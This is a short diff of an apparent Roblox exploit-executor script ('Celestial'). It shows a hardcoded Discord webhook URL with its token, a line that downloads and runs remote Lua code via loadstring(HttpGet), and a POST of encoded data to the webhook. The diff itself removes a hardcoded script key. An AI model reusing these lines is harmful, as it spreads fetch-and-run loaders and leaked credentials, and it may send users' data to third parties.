@@ -1,7 +1,6 @@
 local webhookUrl = "https://discord.com/api/webhooks/1387691970490531982/7BlMni3EGmBBiBOev2uY6NC8ExsfOWgdJOcNGuugAvrNWULZqWauL1RtmlRPuLR7LXzx"
 local utils = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/refs/heads/main/Libraries/Core%20Utilities.lua"))()
 
-getgenv().script_key = "lQwkSPLnL29AIKCAxmWuQ91M0gzjPuUugJ0Xd";
 local auth = loadstring(readfile("Celestial/Authentication.lua"))()
 auth.trigger()
 
@@ -103,5 +102,7 @@ local encodedData = httpService:JSONEncode(data)
 local headers = {["content-type"] = "application/json"}
 local args = {Url = webhookUrl, Body = encodedData, Method = "POST", Headers = headers}
 request(args)
+
+task.wait(5)
 
 auth.clearStoredKey()
